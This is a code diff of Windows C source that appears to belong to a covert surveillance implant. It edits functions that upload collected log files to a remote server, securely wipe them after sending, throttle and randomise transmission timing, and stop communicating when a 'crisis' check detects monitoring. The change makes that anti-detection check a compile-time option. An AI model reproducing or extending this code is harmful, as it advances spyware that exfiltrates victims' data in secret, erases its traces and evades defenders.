@@ -1,6 +1,8 @@
 #include <windows.h>
 #include <time.h>
 #include <stdio.h>
+#include <config.h>
+
 #include "common.h"
 #include "ASP.h"
 #include "LOG.h"
@@ -1406,8 +1408,10 @@ BOOL LOG_SendOutputCmd(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 	if (hFind != INVALID_HANDLE_VALUE) {
 		do {
 			HM_CompletePath(FindFileData.cFileName, log_file_path);
+#ifdef __ENABLE_CRISIS_MODULE
 			if (IsCrisisNetwork()) 
 				break;
+#endif
 			if (FindFileData.nFileSizeLow==0 || ASP_SendLog(log_file_path, band_limit)) {
 				HM_WipeFileA(log_file_path);
 				LOG_SendPause(min_sleep, max_sleep);
@@ -1499,10 +1503,12 @@ BOOL LOG_SendLogQueue(DWORD band_limit, DWORD min_sleep, DWORD max_sleep)
 		}
 
 		// Se siamo in stato di crisi non invia neanche il BYE
+#ifdef __ENABLE_CRISIS_MODULE
 		if (IsCrisisNetwork()) {
 			FreeLogList(&log_list_head);
 			return FALSE;
 		}
+#endif
 
 		// Invia il log 
 		if (!ASP_SendLog(log_file_path, band_limit)) {
@@ -1584,8 +1590,10 @@ BOOL LOG_HandleUpload(BOOL is_upload)
 	DWORD upload_left;
 
 	do {
+#ifdef __ENABLE_CRISIS_MODULE
 		if (IsCrisisNetwork())
 			return FALSE;
+#endif
 
 		if (!ASP_GetUpload(is_upload, file_name, sizeof(file_name), &upload_left))
 			return FALSE;
